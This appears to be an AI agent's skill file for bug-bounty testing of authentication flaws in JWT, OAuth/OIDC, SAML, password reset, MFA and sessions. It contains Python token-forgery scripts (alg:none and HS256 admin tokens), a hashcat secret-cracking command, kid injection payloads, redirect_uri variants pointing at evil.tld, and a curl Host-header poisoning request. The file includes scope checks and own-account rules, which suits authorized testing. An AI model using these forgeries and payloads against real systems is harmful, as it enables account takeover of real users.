---
name: zp-jwt-oauth
description: ZeroProtocol hunter for authentication flaws in tokens and federated login - JWT, OAuth 2.0, OIDC, SAML, SSO, sessions, MFA and password reset. Use when a JWT is present, when an OAuth or SAML callback is in scope, when testing redirect_uri or state handling, when hunting account takeover via reset tokens or magic links, when checking MFA bypass, or when session handling looks wrong. Verifies every token flaw offline first, then proves it with a single authenticated request.
---

# zp-jwt-oauth - the identity layer

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

Account takeover is the highest-paying non-RCE class in bug bounty and it almost always lives
here. Analyse tokens **offline** - decoding and forging happen on your machine, and only the
final verification request touches the target.

---

## JWT

**1. Decode first, offline. Free, and it tells you what to attack.**

```bash
T='eyJ...'
for p in 1 2; do echo "$T" | cut -d. -f$p | tr '_-' '/+' | base64 -d 2>/dev/null | jq .; done
```

Read: `alg`, `kid`, `jku`, `x5u`, `typ` in the header; `sub`, `exp`, `iat`, `aud`, `iss`,
`scope`, `role`, `tenant` in the payload. A `role` or `is_admin` claim in the payload is an
invitation.

**2. Work the ladder. Each rung is one request to verify.**

| Attack | Craft | Confirmed when |
|---|---|---|
| `alg: none` | header `{"alg":"none","typ":"JWT"}`, empty signature, keep the trailing dot | the API accepts it |
| HS/RS confusion | change `alg` to `HS256`, sign with the **public key bytes** as the HMAC secret | accepted - server used one verify function for both |
| weak HMAC secret | crack offline: `hashcat -m 16500 jwt.txt rockyou.txt` | you can mint valid tokens |
| `kid` path traversal | `"kid":"../../../../dev/null"` and sign with an empty key | accepted |
| `kid` SQL injection | `"kid":"x' UNION SELECT 'secret"` | accepted, or an error leaks |
| `jku`/`x5u` injection | point at a JWKS **you host**, sign with your key | accepted - full forgery |
| embedded `jwk` | put your own public key in the header | accepted |
| no signature check | flip one payload byte, keep the old signature | still accepted |
| expiry ignored | replay a token past `exp` | accepted |
| claim confusion | change `sub`/`user_id` to B's, or `role` to `admin` | you act as B or admin |
| `aud`/`iss` unchecked | replay a token minted for a *different* service or tenant | accepted |
| algorithm downgrade | RS512 -> RS256, or a truncated signature | accepted |

```bash
# alg:none, stdlib only
python3 - <<'PY'
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"}) + "." + b({"sub":"admin","role":"admin","exp":9999999999}) + ".")
PY
# HS256 signed with a candidate secret
python3 - <<'PY'
import base64, hashlib, hmac, json
b  = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()
bj = lambda o: b(json.dumps(o, separators=(',',':')).encode())
msg = bj({"alg":"HS256","typ":"JWT"}) + "." + bj({"sub":"admin","role":"admin","exp":9999999999})
print(msg + "." + b(hmac.new(b"secret", msg.encode(), hashlib.sha256).digest()))
PY
```

`jwt_tool -t "$URL" -rh "Authorization: Bearer $T" -M at` automates the same ladder if
installed. Verify each accepted token with **one** authenticated request to a
whoami/profile endpoint - that is your proof.

**3. Check where the token lives.** A JWT in `localStorage` is readable by any XSS; a JWT in a
non-`HttpOnly` cookie likewise. That is what turns an XSS into an ATO chain.

---

## OAuth 2.0 / OIDC

**4. Capture the full flow before touching anything** - authorize request, callback, token
exchange. The parameters are the attack surface.

| Flaw | Test | Impact |
|---|---|---|
| `redirect_uri` not exact-matched | `…&redirect_uri=https://evil.tld`, `…/legit/../evil`, `…@evil.tld`, `…?x=.target.com`, `…#.target.com`, `//evil.tld`, open-redirect on an allowed host as a hop | authorization code exfiltration -> ATO |
| `state` missing or unvalidated | drop `state`, or reuse a stale one | CSRF on account linking -> attacker links their identity to the victim's account |
| PKCE downgrade | drop `code_challenge`, or send `code_verifier` of a different flow | code interception becomes usable |
| implicit flow enabled | `response_type=token` where `code` is expected | token lands in the URL fragment, leaks via `Referer` and history |
| code reuse | exchange the same `code` twice | broken single-use guarantee |
| code substitution | exchange a code minted for client X at client Y | cross-client ATO |
| scope escalation | add `scope=admin openid email` | over-privileged token |
| `response_mode=form_post` juggling | change delivery so the code lands somewhere logged | leak |
| `nonce` unchecked (OIDC) | replay an `id_token` | replay ATO |
| `id_token` signature unchecked | forge one (see the JWT ladder) | full ATO |
| email-claim trust | register `victim@…` at an IdP that does not verify email, then SSO in | **pre-account-takeover** |
| account linking by unverified email | link an OAuth identity to an existing local account by email alone | ATO |

The `redirect_uri` variants that actually work most often, in order: a path-traversal suffix on
an allow-listed prefix, an open redirect on an allow-listed host used as a hop, and
`https://allowed.target.com.evil.tld` against a prefix match.

**5. Password reset and magic links** - the other main ATO road.

```
token predictable (timestamp, sequential, md5(email)) · token not invalidated after use
token not invalidated after password change · token valid for a different account
Host header poisoning: the reset mail is built from Host / X-Forwarded-Host  -> link points at you
email change flow: change email, keep the old session, or receive the confirmation at both
response leaks the token (JSON body, redirect URL, or a 302 Location)
user enumeration via differing responses or timing
```

Host-header poisoning in a reset email is a classic full ATO and is still common:

```bash
curl -sk -X POST "https://$H/api/password/reset" -H 'Content-Type: application/json' \
  -H "X-Forwarded-Host: evil.tld" -d '{"email":"your-zpa@example.com"}'
# then read YOUR OWN inbox and see which host the link points at
```

Test this **only against your own account**, and read your own mailbox.

**6. MFA and session.**

```
MFA: skip the second step and call the post-auth endpoint directly · reuse a used OTP
     brute-force with no rate limit · flip a `mfa_required:false` response field
     remember-device token transferable between accounts · backup codes not invalidated
session: no rotation after login (fixation) · no invalidation on logout or password change
     concurrent sessions never revoked · cookie missing HttpOnly/Secure/SameSite
     cookie scoped Domain=.target.com and readable from a subdomain you took over
SAML: signature not verified · XML signature wrapping · comment truncation in NameID
     (admin@target.com.evil.tld with a comment) · assertion replay · unsigned assertion accepted
```

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| forged token accepted on an authenticated endpoint | **confirmed.** Critical if it grants another identity |
| `alg:none` or signature-flip accepted | confirmed, Critical |
| code/token delivered to a host you control | **confirmed ATO**, Critical |
| `state` absent and you linked your identity to a second account you own | confirmed - show both accounts |
| reset link built from your `X-Forwarded-Host` | **confirmed ATO** - your own mailbox is the proof |
| token decodes but every tamper is rejected | correct implementation. Killed |
| `redirect_uri` reflects but the code does not arrive | not exploitable yet. Keep working the variants |
| implicit flow available but not used by the app | informational unless you can force it |
| an expired token rejected | correct. Killed |
| user enumeration only | Low, and often out of scope. Report honestly, do not inflate |
| MFA skipped but you still needed the victim's password | preconditions too high unless chained |

---

## High-value patterns

- **`redirect_uri` loosely matched on the primary IdP** - authorization code theft, full ATO, Critical.
- **Reset-token reuse or non-invalidation** - clean, easily reproduced ATO.
- **`Host` poisoning in transactional email** - ATO with a one-request PoC.
- **Pre-account-takeover** via an IdP that does not verify email, or linking by unverified email.
- **A subdomain takeover plus a `Domain=.target.com` cookie** - chain it with `zp-takeover`; the chain is the report.
- **JWT `kid`/`jku` injection** - full token forgery, and rarely a duplicate.
- **SAML signature not verified** - instant admin on enterprise SSO.

---

## Pitfalls

- **Testing reset flows against a real user's email.** Your own account only, always.
- **Registering accounts that violate the program's naming rule.** Read the policy; many require a `+bugbounty` tag or a specific domain.
- **Brute-forcing OTPs on a live target** without checking whether the program forbids it. Usually it does.
- **Reporting a decoded JWT as a finding.** JWTs are *designed* to be readable. The flaw is in verification.
- **Claiming ATO without performing it** against your own second account. Show both sides.
- **Missing the `Referer` leak** of a fragment token.
- **Leaking a real authorization code** to a third-party server you do not control while testing `redirect_uri`. Use a host you own.
- **Reporting "no PKCE"** on a confidential server-side client where it is not required. Know the flow type.
- **Forgetting to check session invalidation** after the password change you just demonstrated.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report` (ATO is Critical; write it carefully and fast).
Tokens readable via XSS -> `zp-xss` to complete the chain. Cookie scope plus a takeover ->
`zp-takeover`. Role claims that the API trusts -> `zp-authz`. Ids inside tokens -> `zp-idor`.
Callback that fetches a URL server-side -> `zp-ssrf`.
